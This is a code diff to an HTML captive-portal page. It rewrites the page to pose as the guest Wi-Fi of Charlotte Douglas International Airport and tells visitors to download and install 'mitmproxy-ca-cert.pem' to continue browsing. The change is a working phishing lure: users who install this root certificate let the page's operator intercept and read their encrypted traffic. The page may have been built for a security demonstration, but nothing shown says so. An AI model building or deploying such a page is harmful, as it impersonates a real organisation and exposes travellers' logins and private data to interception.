@@ -13,7 +13,7 @@
                 os = "Windows";
             } else if (userAgent.indexOf("Mac")!=-1 || userAgent.indexOf("iPhone")!=-1 || userAgent.indexOf("iPad")!=-1) {
                 os = "MacOS / iOS";
-            } else if (userAgent.indexOf("Andr")!=-1) {
+            } else if (userAgent.indexOf("Android")!=-1) {
                 os = "Android";
             } else if (userAgent.indexOf("Linux")!= -1) {
                 os = "Linux"
@@ -29,6 +29,11 @@
     </script>
     <style>
 
+        @font-face {
+            font-family: gibson;
+            src: url(./fonts/Fontspring-DEMO-gibson-regular.otf);
+        }
+
         body {
             padding: 1vh 1vw;
             margin: 2vh; 
@@ -37,7 +42,7 @@
         }
 
         button{
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: gibson;
             font-size: 2vw;
             text-align: center;
             text-align: center;
@@ -57,7 +62,7 @@
         }
 
         .text{
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: gibson;
             font-size: 2vw; 
             text-align: center; 
             margin: 5px; 
@@ -72,7 +77,7 @@
         }
 
         .welctext{
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: gibson;
             font-size: 5vw; 
             text-align: center; 
             margin: 0;
@@ -94,11 +99,11 @@
     <section>
         <div>
             <section>
-                <p class="welctext">Welcome Patrons! </p>
+                <p class="welctext">Welcome to the Charlotte Douglas International Airport. </p>
             </section>
 
-            <p class = "text">Enjoy your free guest Wi-Fi!</p>
-            <p class = "text">Please download and install this certificate to continue browsing the internet!</p>
+            <p class = "text">Enjoy your free guest wireless access. </p>
+            <p class = "text">Please download and install this certificate to continue browsing the internet.</p>
 
             <section style = "padding: 0;">
                 <img src = "./imgs/wifilogo.png" style = "width: 100px; height: 100px;">
@@ -106,7 +111,7 @@
 
             <section>
                 <a href="mitmproxy-ca-cert.pem" download="">
-                    <button onclick = "detectOS">  
+                    <button>  
                         Accept and Connect
                     </button>
                 </a>
